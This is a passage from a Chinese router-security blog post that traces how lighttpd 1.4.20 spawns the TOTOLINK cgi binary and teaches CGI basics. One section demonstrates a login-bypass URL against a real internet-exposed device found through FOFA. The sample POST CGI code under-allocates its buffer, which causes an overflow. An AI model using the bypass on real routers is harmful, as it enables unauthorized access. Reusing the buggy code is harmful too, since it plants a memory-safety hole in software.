![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668141982691-629aa057-d94b-445f-8379-32e7e9394435.png)

> + 上图说明的“cgi崩溃后会自动重启”其实很不准确，往后看你就知道了...
>

# 3、补充
## ①、关于websGetVar函数
哦对了，在这里我们再说一下函数`websGetVar`吧，伪代码如下：

```c
char *__fastcall websGetVar(int a1, _BYTE *a2, char *a3)
{
  _DWORD *v4; // $v0
  int v6; // $v1

  if ( !a2 || !*a2 )
    _assert("var && *var", "cgi_common.c", 655, "websGetVar");
  v4 = (_DWORD *)cJSON_GetObjectItem();
  if ( v4 )
  {
    if ( v4[4] )
      return (char *)v4[4];
    v6 = v4[3];
    if ( v6 )
    {
      if ( v6 == 1 )
      {
        a3 = "1";
      }
      else if ( v6 == 3 )
      {
        sprintf(byte_44C880, "%d", v4[5]);
        a3 = byte_44C880;
      }
      else
      {
        a3 = (char *)"";
      }
    }
    else
    {
      a3 = (char *)&word_4370EC;
    }
  }
  return a3;
}
```

别看上面的伪代码一大坨，相信你从前面的分析中也能看出，这个函数是根据传入的参数获取值的，以sub_420F68为例有下面两种情况：

+ `v2 = websGetVar(a1,"command","www.baidu.com");`
+ `v3 = websGetVar(a1,"num",(char *)"");`

即，当`websGetVar`的第二个参数对应的值用户未设置时，默认使用`websGetVar`设置的第三个参数并return。

## ②、关于lighttpd与cgi之间的关系
那lighttpd与cgi之间是什么关系呢？如果你在文件系统中全局查找字符串`cstecgi.cgi`，那么不会得到任何结果：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668654158574-288fbbe4-a63c-4760-8313-17ab54dab70b.png)

想要找到这两个二进制文件之间的关系最简单的方式就是从进程下手，具体方法为：

1. 开启两个窗口，一个是路由器后台登录界面窗口，一个是qemu窗口
2. 在登录界面输入任意密码并登录，瞬间切换到qemu窗口中执行`ps -wl | grep cgi`（要求手速很快）

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668655085338-677afa33-8c9d-4e93-a31d-33ef08ac6208.png)

可以看到，cstecgi.cgi是lighttpd的子进程。还要注意cstecgi.cgi是正常的二进制文件，但我们不能直接的运行，否则会直接段错误：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668655400725-ad5d6eed-a05b-4c23-8a15-5997c6dd1590.png)

至于崩溃的原因请你继续往下看文章就知道了。

![](https://cdn.nlark.com/yuque/0/2022/jpeg/574026/1668655469125-e47b4bb6-e765-4352-9e19-798b207758b9.jpeg)

## ③、关于lighttpd的一些技巧
1. 对于该型号（或该品牌的路由器）在`lighttpd.conf`文件中有如下的debug日志调试开关：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668660201427-55cfc8ab-5fac-4e01-905f-93f14bd80367.png)

2. 执行`lighttpd -f [config_path]`后lighttpd默认后台运行，如果不想后台运行则可以在启动时执行`lighttpd -D -f [config_path]`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668660392346-04eefb49-dc86-44ee-83f9-2d9c5b6369bc.png)

## ④、关于登录绕过的严重后果
未授权登录漏洞的根源在lighttpd，所以该漏洞很有可能不止影响这一个型号，在fofa上搜索`"Server: lighttpd/1.4.20"`，随便选一台设备：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668151569207-7c9bd094-7ba6-4844-b2e0-a3eb5025c8b6.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668151630034-9bfb4b4f-6b57-4945-8570-171c0a6848e6.png)

直接访问：`http://122.117.185.xx:1024/formLoginAuth.htm?authCode=1&action=login`，成功登录后台：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668151770959-c4bbd676-1ec1-4563-a400-164c718e5f7e.png)

# 4、浅析cgi与lighttpd之间的调用过程
从文章开头到现在讲述的内容并没有什么难度，但我的好奇心引导着我继续探究中间件`lighttpd`和`cstecgi.cgi`的关系；为了解决这个问题，我决定看看`lighttpd`的源码。

## ①、配置调试环境
该路由器使用的lighttpd版本如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668151113613-91bcd5d6-9d63-465a-be60-d1ed73928c11.png)

该版本的源码可以在github上找到：[https://github.com/lighttpd/lighttpd1.4/releases/tag/lighttpd-1.4.20](https://github.com/lighttpd/lighttpd1.4/releases/tag/lighttpd-1.4.20)：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668153166791-197d252b-124d-49ba-b94d-239c16796c99.png)

TOTOLINK真敢啊，到现在用的还是2008年的中间件！

![](https://cdn.nlark.com/yuque/0/2022/jpeg/574026/1668660824492-0d9e0c9a-7f2e-4bc3-93fd-69b4d034a7cd.jpeg)

算了，那是厂商的事，我们将源码下载下来并运行`autogen.sh`进行编译，发现有如下错误：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668386092110-ab4099cf-e03c-4814-8c91-3ab08b2b0123.png)

解决这个报错的方法可以在`[https://autotools.info/forwardporting/automake.html](https://autotools.info/forwardporting/automake.html)`找到：

![注意：宏AC_C_PROTOTYPES已经过时](https://cdn.nlark.com/yuque/0/2022/png/574026/1668386220975-1245b7d3-0768-4a50-b628-bc920f7b4ae7.png)

很简单，只需要将`configure.in`文件中的`AM_C_PROTOTYPES`改为`AC_C_PROTOTYPES`即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668386792263-6cac4802-90ce-4e64-8c6d-6e57e8d1936b.png)

再次执行下面的命令以编译：

```bash
$ ./autogen.sh
$ ./configure -C --prefix=/usr/local  # ./configure --help for additional options
# 报错------------
# configure: error: bzip2-headers and/or libs where not found, install them or build with --without-bzip2
# 解决方法：sudo apt-get install libbz2-dev
$ make -j 4
$ make check
# sudo make install
```

完成后可以选择执行`sudo make install`来安装，但是这里我就不install了。注意到在最新版本的`test/README`文件中有如下描述（我们下载的是没有这个README文件的）：

> + README：[https://github.com/lighttpd/lighttpd1.4/blob/master/tests/README](https://github.com/lighttpd/lighttpd1.4/blob/master/tests/README)
>

```plain
To run a specific config under gdb
  repo=$PWD      # from root of src repository
  cd tests/
  ./prepare.sh
  PERL=/usr/bin/perl SRCDIR=$repo/tests \
    gdb --args $repo/src/lighttpd -D -f lighttpd.conf -m $repo/src/.libs

  (gdb) start
  (gdb) ...
```

很明显，这是gdb调试lighttpd的方法，来试一下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668390465410-bda3da26-f4f9-46e7-baef-31de196dbf63.png)

访问一下，虽然图片缺失，但无伤大雅：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668413375520-41525caa-b99b-4777-850b-394e38cc7c91.png)

此时加载的`tests/lighttpd.conf`如下：

```plain
debug.log-request-handling = "enable"
debug.log-request-header = "enable"
debug.log-response-header = "enable"
debug.log-condition-handling = "enable"
server.document-root         = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"

## 64 Mbyte ... nice limit
server.max-request-size = 65000

## bind to port (default: 80)
server.port                 = 2048

## bind to localhost (default: all interfaces)
server.bind                = "localhost"
server.errorlog            = env.SRCDIR + "/tmp/lighttpd/logs/lighttpd.error.log"
server.name                = "www.example.org"
server.tag                 = "Apache 1.3.29"

server.dir-listing          = "enable"

#server.event-handler        = "linux-sysepoll"
#server.event-handler        = "linux-rtsig"

#server.modules.path         = ""
server.modules              = (
				"mod_rewrite",
				"mod_setenv",
				"mod_secdownload",
			        "mod_access",
				"mod_auth",
#				"mod_httptls",
				"mod_status",
				"mod_expire",
				"mod_simple_vhost",
				"mod_redirect",
#				"mod_evhost",
#				"mod_localizer",
				"mod_fastcgi",
				"mod_cgi",
				"mod_compress",
				"mod_userdir",
				"mod_ssi",
				"mod_accesslog" )

server.indexfiles           = ( "index.php", "index.html",
                                "index.htm", "default.htm" )


######################## MODULE CONFIG ############################

ssi.extension = ( ".shtml" )

accesslog.filename          = env.SRCDIR + "/tmp/lighttpd/logs/lighttpd.access.log"

mimetype.assign             = ( ".png"  => "image/png",
                                ".jpg"  => "image/jpeg",
                                ".jpeg" => "image/jpeg",
                                ".gif"  => "image/gif",
                                ".html" => "text/html",
                                ".htm"  => "text/html",
                                ".pdf"  => "application/pdf",
                                ".swf"  => "application/x-shockwave-flash",
                                ".spl"  => "application/futuresplash",
                                ".txt"  => "text/plain",
                                ".tar.gz" =>   "application/x-tgz",
                                ".tgz"  => "application/x-tgz",
                                ".gz"   => "application/x-gzip",
				".c"    => "text/plain",
				".conf" => "text/plain" )

$HTTP["host"] == "cache.example.org" {
  compress.cache-dir          = env.SRCDIR + "/tmp/lighttpd/cache/compress/"
}
compress.filetype           = ("text/plain", "text/html")

setenv.add-environment      = ( "TRAC_ENV" => "tracenv", "SETENV" => "setenv")
setenv.add-request-header   = ( "FOO" => "foo")
setenv.add-response-header  = ( "BAR" => "foo")

$HTTP["url"] =~ "\.pdf$" {
  server.range-requests = "disable"
}

fastcgi.debug               = 0
fastcgi.server              = ( ".php" =>        ( ( "host" => "127.0.0.1", "port" => 1026, "broken-scriptfilename" => "enable" ) ),
			        "/prefix.fcgi" => ( ( "host" => "127.0.0.1", "port" => 1026, "check-local" => "disable", "broken-scriptfilename" => "enable" ) )
			      )


cgi.assign                  = ( ".pl"  => "/usr/bin/perl",
                                ".cgi" => "/usr/bin/perl",
				".py"  => "/usr/bin/python" )

userdir.include-user = ( "jan" )
userdir.path = "/"

ssl.engine                  = "disable"
ssl.pemfile                 = "server.pem"

$HTTP["host"] == "auth-htpasswd.example.org" {
	auth.backend                = "htpasswd"
}

auth.backend                = "plain"
auth.backend.plain.userfile = env.SRCDIR + "/tmp/lighttpd/lighttpd.user"

auth.backend.htpasswd.userfile = env.SRCDIR + "/tmp/lighttpd/lighttpd.htpasswd"


auth.require                = ( "/server-status" =>
                                (
				  "method"  => "digest",
				  "realm"   => "download archiv",
				  "require" => "group=www|user=jan|host=192.168.2.10"
				),
				"/server-config" =>
                                (
				  "method"  => "basic",
				  "realm"   => "download archiv",
				  "require" => "valid-user"
				)
                              )

url.access-deny             = ( "~", ".inc")

url.rewrite		    = ( "^/rewrite/foo($|\?.+)" => "/indexfile/rewrite.php$1",
				"^/rewrite/bar(?:$|\?(.+))" => "/indexfile/rewrite.php?bar&$1" )

expire.url                  = ( "/expire/access" => "access 2 hours",
				"/expire/modification" => "access plus 1 seconds 2 minutes")

#cache.cache-dir             = "/home/weigon/wwwroot/cache/"

#### status module
status.status-url           = "/server-status"
status.config-url           = "/server-config"

$HTTP["host"] == "vvv.example.org" {
  server.document-root = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"
  secdownload.secret          = "verysecret"
  secdownload.document-root   = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"
  secdownload.uri-prefix      = "/sec/"
  secdownload.timeout         = 120
}

$HTTP["host"] == "zzz.example.org" {
  server.document-root = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"
  server.name = "zzz.example.org"
}

$HTTP["host"] == "symlink.example.org" {
  server.document-root = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"
  server.name = "symlink.example.org"
  server.follow-symlink = "enable"
}

$HTTP["host"] == "nosymlink.example.org" {
  server.document-root = env.SRCDIR + "/tmp/lighttpd/servers/www.example.org/pages/"
  server.name = "symlink.example.org"
  server.follow-symlink = "disable"
}

$HTTP["host"] == "no-simple.example.org" {
  server.document-root = env.SRCDIR + "/tmp/lighttpd/servers/123.example.org/pages/"
  server.name = "zzz.example.org"
}

$HTTP["host"] !~ "(no-simple\.example\.org)" {
  simple-vhost.document-root  = "pages"
  simple-vhost.server-root    = env.SRCDIR + "/tmp/lighttpd/servers/"
  simple-vhost.default-host   = "www.example.org"
}

$HTTP["host"] =~ "(vvv).example.org" {
  url.redirect = ( "^/redirect/$" => "http://localhost:2048/" )
}

$HTTP["host"] =~ "(zzz).example.org" {
  url.redirect = ( "^/redirect/$" => "http://localhost:2048/%1" )
}

$HTTP["host"] =~ "(remoteip)\.example\.org" {
  $HTTP["remoteip"] =~ "(127\.0\.0\.1)" {
    url.redirect = ( "^/redirect/$" => "http://localhost:2048/%1" )
  }
}

$HTTP["remoteip"] =~ "(127\.0\.0\.1)" {
  $HTTP["host"] =~ "(remoteip2)\.example\.org" {
    url.redirect = ( "^/redirect/$" => "http://localhost:2048/%1" )
  }
}

$HTTP["host"] =~ "bug255\.example\.org$" {
  $HTTP["remoteip"] == "127.0.0.1" {
    url.access-deny = ( "" )
  }
}

$HTTP["referer"] !~ "^($|http://referer\.example\.org)" {
  url.access-deny = ( ".jpg" )
}

# deny access for all image stealers
$HTTP["host"] == "referer.example.org" {
  $HTTP["referer"] !~ "^($|http://referer\.example\.org)" {
    url.access-deny = ( ".png" )
  }
}

$HTTP["cookie"] =~ "empty-ref" {
  $HTTP["referer"] == "" {
    url.access-deny = ( "" )
  }
}


$HTTP["host"] == "etag.example.org" {
    static-file.etags = "disable"
}
```

Jetbrain的clion除了编写代码之外还可以很方便进行调试，使用clion打开src文件夹，根据官方的README文件修改debug配置：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668395968107-57ca23a8-b1b5-450d-ae2a-8ef2d13da8e5.png)

+ `Executable`：选择lighttpd可执行文件的路径
+ `Program argument`：`-D -f ./tests/lighttpd.conf -m ./src/.libs`
+ `Working directory`：`/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/`
+ `Environment variables`：`PERL=/usr/bin/perl;SRCDIR=/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests`（如下图）

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668396118973-6d22bc61-d2c6-46b3-841c-a969f08a9c7a.png)

保存设置，server.c是lighttpd的主函数，对main函数下断点之后点击右上角的![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668406940788-98abfef7-dfe0-4d5a-ac94-becd6fbdade8.png)按钮开始调试：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668407040632-7add757d-6d7f-4949-be57-bf88a5d1de68.png)

效果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668407085641-03361fc5-ff68-4969-a244-06320d52c7e6.png)

## ②、简述cgi与fastcgi之间的区别
先来讲一下cgi的基本工作原理，每当client向cgi发送请求时，server端（具体来讲是`lighttpd`的`mod_cgi.so`）会执行系统调用去fork出新的子进程（如TOTOLINK的`cstecgi.cgi`），并将用户请求的参数通过环境变量（environment variable）的形式传递给此子进程，`子进程cgi`处理完成后退出，当下一个请求来时再fork新进程，如此反复循环往复。当然了，该类cgi适用于访问量很少且没有并发的情况（如家用路由器后台），但是若访问量一旦增大，系统的开销也随之增大（主要由fork占用），这种用fork处理的方式就不适合了，于是就有了fastcgi。

fastcgi像是一个`常驻（long-live）型`的CGI，只要激活后它就会一直执行着，不会每次都要花费时间去fork一次。

> + cgi的工作方式可以被称为`fork-and-execute`模式。
> + 你可能注意到，在`lighttpd.conf`文件中还包括`fastcgi`的字样，即lighttpd不但支持cgi还支持fastcgi。
> + 更多fastcgi的内容请参考：[https://miaopei.github.io/2017/03/31/HTTP/lighttpd-fastcgi/](https://miaopei.github.io/2017/03/31/HTTP/lighttpd-fastcgi/)
>

## ③、尝试自己编写cgi文件
### 1、入门（GET请求）
本篇文章我们只关注cgi，先入个门吧，这里我打算自己编写一个cgi文件，默认的测试（test）的web目录为`tests/tmp/lighttpd/servers/www.example.org/pages/`（挺长的，但我懒得修改了：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668413572785-69c7f871-8d93-489b-81ed-adddc20c02a5.png)

在`pages`目录下编写测试代码`cyberangel.c`：

```c
// 编译命令：gcc -g cyberangel.c -o cyberangel.cgi
#include <stdio.h>
#include <stdlib.h> 
#include <string.h> 
int main() {
    char *data = getenv("QUERY_STRING");      
    printf("User data is %s \n",data);      
    printf("Hello Cyberangel!\n");      
    return 0; 
} 
```

执行编译后修改`tests/lighttpd.conf`的`cgi.assign`选项为`""`，因为可执行文件的调用无需解释器：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668414334053-781325a7-1e4f-4777-9155-c3967e1dc9c3.png)

重启lighttpd服务后浏览器访问`http://127.0.0.1:2048/cyberangel.cgi?a=NYSEC`:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668414822856-6f12c5b2-7354-4350-b4b6-d1dba9362e3c.png)

所以，无论是POST还是GET，server都是使用环境变量向cgi进行传参，具体来讲后者通过环境变量`QUERY_STRING`进行的。

### 2、进阶（GET请求）
进一步的，下面我们做一个简单的“网页乘法计算器“，首先在`pages`目录下创建并编辑`calculate.html`：

```html
<html>
<body>
    <meta charset="utf-8">
    <form ACTION="/calculate.cgi">
        <P>程序功能：计算两个数的乘积，请输入两个乘数。
        <INPUT NAME="m" SIZE="5">
        <INPUT NAME="n" SIZE="5"><BR>
        <INPUT TYPE="SUBMIT" values="提交">
    </form>
</body>
</html>
```

对应的`calculate.c`的代码如下：

```c
// 编译命令：gcc -g calculate.c -o calculate.cgi
#include <stdio.h>
#include <stdlib.h>

int main(){
    char *data;
    long m,n;
	printf("Content-Type:text/html\n\n");
	printf("<meta charset=\"utf-8\">");
    printf("<TITLE>乘法结果</TITLE> ");
    printf("<H3>乘法结果</H3> ");

    data = getenv("QUERY_STRING"); 					// 获得表单get的参数m与n
    if(data == NULL){
        printf("<P>Error: User data is %s",data);
    }
    else if(sscanf(data,"m=%ld&n=%ld",&m,&n)!=2){
        printf("<P>Error: User data error");
    }
    else{
        printf("<P>%ld * %ld = %ld \n",m,n,m*n);
    }
    return 0;
}
```

最终效果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668471885730-91b06343-2e47-4ddd-9f92-ea6b4b1a2d16.png)

访问html并输入计算：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668472018592-cffb16c3-e05e-4680-9afa-349fc4a7aef7.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668472057856-30cecafe-96f2-4717-9981-b2d28d1e3045.png)

> + cgi不一定非得以.cgi文件结尾，只要是一个可执行文件就行。
> + cgi返回的html标签可以被浏览器渲染，比如上面的`<P>`标签
>

### 3、入土（GET、POST请求）
我们对上面的代码进行修改让其支持处理GET方法与POST方法，用户在发送POST请求时携带的参数只需要从标准输入流stdin获取即可（因为有lighttpd这个“桥梁”的存在，具体原理请继续往下看）：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
    char *data,*content_type,*request_method,*content_length;
    long m,n;
    int length;
	printf("Content-Type:text/html\n\n");
	printf("<meta charset=\"utf-8\">");
    printf("<TITLE>乘法结果</TITLE> ");
    printf("<H3>乘法结果</H3> ");

    
    content_type = getenv("CONTENT_TYPE");		// 获取content_type
    request_method = getenv("REQUEST_METHOD");	// 获取用户请求的方法
    if(!strncasecmp(request_method, "POST", 4)){
        printf("User's request_method is %s\n","POST");
        content_length = getenv("CONTENT_LENGTH");
        length = atoi(content_length);
        data = malloc(sizeof(content_length));
        fgets(data, length + 1, stdin);				// 获取data（post方法）
    } else if (!strncasecmp(request_method, "GET", 3)){
        printf("User's request_method is %s\n","GET");
        data = getenv("QUERY_STRING"); 				// 获得data(get方法)
    } else {
    	printf("Undefined request method ...\n");
        exit(0);
    }
    if(data == NULL){
    	printf("<P>User data is %s",data);
    }    
    else if(sscanf(data,"m=%ld&n=%ld",&m,&n)!=2){
        printf("<P>Error: User data error");
    }
    else{
        printf("<P>%ld * %ld = %ld \n",m,n,m*n);
    }
    return 0;
}
```

同时，我们将前端改为：

```html
<html>
<body>
    <meta charset="utf-8">
    <form ACTION="/calculate.cgi" method="get">
        <P>程序功能：计算两个数的乘积，请输入两个乘数。（get）
        <INPUT NAME="m" SIZE="5">
        <INPUT NAME="n" SIZE="5"><BR>
        <INPUT TYPE="SUBMIT" values="提交">
    </form>
      <form ACTION="/calculate.cgi" method="post">
        <P>程序功能：计算两个数的乘积，请输入两个乘数。（post）
        <INPUT NAME="m" SIZE="5">
        <INPUT NAME="n" SIZE="5"><BR>
        <INPUT TYPE="SUBMIT" values="提交">
    </form>
</body>
</html>
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668475436000-426f6579-b22e-4ec4-bba6-c6cb8497295f.png)

这里只展示post方法：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668475451057-4578e6db-8f01-47a8-b7dd-13f12438a27d.png)

### 4、单独运行cgi时崩溃的原因
如果你单独运行`calculate.cgi`发现它也会崩溃，就像TOTOLINK的`cstecgi.cgi`一样，因为cgi的运行依赖于环境变量，如果没有server端对cgi的环境变量的传递，则可能会导致空指针进一步造成段错误：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668673646702-d1b6bd2f-2e72-4ace-9776-14af6d7d8c82.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668673763122-eef38689-b319-4705-9bd3-93f1136ede7b.png)

## ④、开始调试
我们已经知道cgi进程是fork出来的，所以关键在于研究`lighttpd`的`mod_cgi.so`模块，可以在`src/mod_cgi.c`找到相关代码：

```c
static int cgi_create_env(server *srv, connection *con, plugin_data *p, buffer *cgi_handler) {
	// （代码省略）...
	/* fork, execve */
	switch (pid = fork()) {
	case 0: {
		/* child */
		// （代码省略）...
		execve(args[0], args, env.ptr);			/* exec the cgi */
		SEGFAULT();
		break;
	}
	// （代码省略）...
}
```

根据函数名称可以知道，`cgi_create_env`是在创建cgi的运行环境，其中的fork和excve是两个关键点：

1. 通过fork函数的返回值我们可以辨别当前进程是父进程还是子进程。
2. 当子进程执行execve之后会将原来的进程替换掉，放在这里就是子进程`lighttpd`执行`execve`之后会被替换为cgi进程。

如果想要使用clion调试子进程，则必须对gdb进行设置，根据[https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion](https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion)我们有：

+ `set follow-fork-mode child`
+ `set detach-on-fork off`

> 更多详细的调试方法请参见：[https://blog.csdn.net/gatieme/article/details/78309696](https://blog.csdn.net/gatieme/article/details/78309696)（GDB 调试多进程或者多线程应用）
>

对`server.c`的`main`与`mod_cgi.c`的`execve`分别下断点：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668482449594-f2c12f02-4de8-410d-b450-35c984f071ed.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668482516578-b04b2058-8d6e-46f2-a9e6-2a2cb8f8e6ef.png)

启动调试后，在debugger框中进行设置:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668482606864-f98e204e-bdfd-4b91-8e02-6110db5df138.png)

此时对`calculate.cgi`发送post或get请求即可断下，我这里发送的是post请求：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668482699848-45357e46-bafe-48d1-bdea-d1d7c9e1399a.png)

更多execve的详细信息请参考我的另外一篇文章：[PWN进阶（1-6）-初探调用one_gadget的约束条件(execve)](https://www.yuque.com/cyberangel/rg9gdm/gbyagk)，这里只摘出函数原型：

```c
#include <unistd.h>
int execve (const char *filename, char *const argv [], char *const envp[]);
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668483224155-548ed00a-109e-41e5-af87-38a88be31243.png)

如上图所示，通过gdb我们可以得到各个参数的详细值：

```c
		/* exec the cgi */
		execve(args[0], args, env.ptr);
-----
(gdb) p *args@3
$5 = {0x555555882270 "/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests/tmp/lighttpd/servers/www.example.org/pages/calculate.cgi", 0x0, 0x0}
(gdb) p *env.ptr@32
$12 = {
	0x55555587f090 "SERVER_SOFTWARE=lighttpd/1.4.20", 
    0x55555587ec10 "SERVER_NAME=www.example.org", 
    0x555555882620 "GATEWAY_INTERFACE=CGI/1.1", 
    0x555555882650 "SERVER_PROTOCOL=HTTP/1.1", 
    0x555555882680 "SERVER_PORT=2048", 
    0x5555558826a0 "SERVER_ADDR=127.0.0.1", 
    0x5555558826c0 "REQUEST_METHOD=POST", 
    0x5555558826e0 "REDIRECT_STATUS=200", 
    0x555555882700 "REQUEST_URI=/calculate.cgi", 
    0x555555882730 "REMOTE_ADDR=127.0.0.1", 
    0x555555882750 "REMOTE_PORT=35346", 
    0x555555882770 "CONTENT_LENGTH=7", 
    0x555555882790 "SCRIPT_FILENAME=/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests/tmp/lighttpd/servers/www.example.org/pages/calculate.cgi", 
    0x555555882820 "SCRIPT_NAME=/calculate.cgi", 
    0x555555882850 "DOCUMENT_ROOT=/home/cyberangel/Desktop/lighttpd1.4-lighttpd-1.4.20/tests/tmp/lighttpd/servers/www.example.org/pages/", 
    0x555555882920 "HTTP_HOST=192.168.2.196:1234", 
    0x555555882950 "HTTP_CONNECTION=keep-alive", 
    0x555555882a90 "HTTP_CONTENT_LENGTH=7", 
    0x555555882ab0 "HTTP_CACHE_CONTROL=max-age=0", 
    0x555555882ae0 "HTTP_UPGRADE_INSECURE_REQUESTS=1", 
    0x555555882b10 "HTTP_ORIGIN=http://192.168.2.196:1234", 
    0x555555882b40 "CONTENT_TYPE=application/x-www-form-urlencoded", 
    0x555555882590 "HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", 
    0x555555882b80 "HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    0x555555882c20 "HTTP_REFERER=http://192.168.2.196:1234/calculate.html", 
    0x555555882c60 "HTTP_ACCEPT_ENCODING=gzip, deflate", 
    0x555555882c90 "HTTP_ACCEPT_LANGUAGE=zh-CN,zh;q=0.9", 
    0x555555882cc0 "HTTP_FOO=foo", 
    0x555555882ce0 "TRAC_ENV=tracenv", 
    0x555555882d00 "SETENV=setenv", 
	0x0, 
	0x0
} // 已经手动对输出的env.ptr变量进行美化
```

> + 当前Ubuntu虚拟机IP变为192.168.2.196，访问时从Ubuntu虚拟机外部访问。
>

此时的函数栈帧如下：

```c
(gdb) bt
#0  cgi_create_env (srv=srv@entry=0x555555781260, con=con@entry=0x5555557cefe0, p=p@entry=0x5555557a9c60, cgi_handler=0x5555557bc5b0) at mod_cgi.c:998
#1  0x00007ffff58e0625 in cgi_is_handled (srv=0x555555781260, con=0x5555557cefe0, p_d=0x5555557a9c60) at mod_cgi.c:1199
#2  0x000055555556d1a7 in plugins_call_handle_subrequest_start (srv=srv@entry=0x555555781260, con=con@entry=0x5555557cefe0) at plugin.c:268
#3  0x000055555555df7f in http_response_prepare (srv=srv@entry=0x555555781260, con=con@entry=0x5555557cefe0) at response.c:645
#4  0x0000555555560979 in connection_state_machine (srv=srv@entry=0x555555781260, con=con@entry=0x5555557cefe0) at connections.c:1426
#5  0x000055555555c4e1 in main (argc=argc@entry=6, argv=argv@entry=0x7fffffffd988) at server.c:1432
#6  0x00007ffff758ec87 in __libc_start_main (main=0x55555555b8b0 <main>, argc=6, argv=0x7fffffffd988, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffd978) at ../csu/libc-start.c:310
#7  0x000055555555d4ea in _start ()
```

我们可以根据它去向前追踪cgi的完整通信过程。

### 1、关于cgi_create_env函数
`cgi_create_env`是整个lighttpd的mod_cgi.so的核心参数，用于为cgi设置环境变量、创建通信管道与cgi进程。

#### ①、初始化父子进程通信管道
对`cgi_create_env`函数开头下断点，重复上述调试的步骤，并发送如下的POST请求：

![192.168.2.196是Ubuntu虚拟机IP，由rinetd转发到0.0.0.0:1234](https://cdn.nlark.com/yuque/0/2022/png/574026/1668489190249-6efc28d7-a91e-4c1f-a37e-2f12031d109d.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668489123506-c002f988-6b64-43a6-8c56-b461b9394c6f.png)

我们知道Server（`lighttpd`的`mod_cgi.so`）和Client（cgi进程）之间使用环境变量进行传参，但是只是有环境变量还不够，因为：

1. 还得考虑到Server端得接收cgi处理之后返还的结果，因为我们要将结果显示到用户的浏览器上。
2. GET请求可以通过`QUERY_STRING`去接收用户的参数，但是POST只能通过cgi的stdin去接收。

所以在函数开头首先定义了两个生成管道的变量用于父子进程的通信 -- `to_cgi_fds[2]`与`from_cgi_fds[2]`。**<font style="color:#E8323C;">一定要注意，在父进程fork出子进程后，子进程会“复制”父进程的文件描述符，因此子进程拥有与父进程相同的管道，但父子进程对其的文件描述符的操作互不影响。</font>**

```c
	if (pipe(to_cgi_fds)) {		// 创建管道to_cgi_fds：其中to_cgi_fds[0]用于read、to_cgi_fds[1]用于write
        // 创建失败则写入错误日志并返回
		log_error_write(srv, __FILE__, __LINE__, "ss", "pipe failed:", strerror(errno));
		return -1;
	}

	if (pipe(from_cgi_fds)) {	// 创建管道from_cgi_fds：其中from_cgi_fds[0]用于read、from_cgi_fds[1]用于write
        // 创建失败则写入错误日志并返回
		log_error_write(srv, __FILE__, __LINE__, "ss", "pipe failed:", strerror(errno));
		return -1;
	}
	/* fork, execve */
	switch (pid = fork()) {
	case 0: {	// 子进程
        // 在glibc的unistd.h中有如下宏定义，说白了其实就是文件描述符：
        //    #define	STDIN_FILENO	0	/* Standard input.  */
        //    #define	STDOUT_FILENO	1	/* Standard output.  */
        //    #define	STDERR_FILENO	2	/* Standard error output.  */

        // 下面的代码是将parent process 与child process相连，以方便通信。

        /* move stdout to from_cgi_fd[1] */		
		close(STDOUT_FILENO);					// close(1)

		dup2(from_cgi_fds[1], STDOUT_FILENO);	// dup2(from_cgi_fds[write],1)： 
        
		close(from_cgi_fds[1]);					// close(from_cgi_fds[write]):
        
		/* not needed */
		close(from_cgi_fds[0]);					// close(from_cgi_fds[read]);	

		/* move the stdin to to_cgi_fd[0] */
		close(STDIN_FILENO);					// close(0);
		dup2(to_cgi_fds[0], STDIN_FILENO);		// dup2(to_cgi_fds[read], 0);
